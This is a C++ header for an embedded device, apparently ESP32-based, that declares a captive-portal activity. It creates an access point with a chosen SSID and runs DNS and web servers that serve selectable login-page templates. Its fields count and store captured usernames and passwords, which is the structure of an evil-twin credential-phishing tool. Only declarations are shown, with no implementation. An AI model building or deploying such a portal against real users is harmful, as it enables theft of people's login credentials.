#pragma once
#include <DNSServer.h>
#include <WebServer.h>

#include <cstdint>
#include <string>
#include <vector>

#include "activities/Activity.h"
#include "util/ButtonNavigator.h"

class CaptivePortalActivity final : public Activity {
 public:
  explicit CaptivePortalActivity(GfxRenderer& renderer, MappedInputManager& mappedInput)
      : Activity("CaptivePortal", renderer, mappedInput) {}

  void onEnter() override;
  void onExit() override;
  void loop() override;
  void render(RenderLock&&) override;
  bool preventAutoSleep() override { return true; }
  bool skipLoopDelay() override { return state == RUNNING; }

 private:
  enum State { SELECT_TEMPLATE, ENTER_SSID, RUNNING, STOPPED };

  State state = SELECT_TEMPLATE;
  std::vector<std::string> templates;
  ButtonNavigator buttonNavigator;
  int selectorIndex = 0;
  std::string selectedTemplate;
  std::string apSsid;
  int capturedCount = 0;
  std::string lastUsername;
  std::string lastPassword;

  std::unique_ptr<WebServer> webServer;
  std::unique_ptr<DNSServer> dnsServer;

  void loadTemplates();
  void startPortal();
  void stopPortal();
  void handleRoot();
  void handleLogin();
  void handleNotFound();
  void logCredentials(const std::string& username, const std::string& password);
};
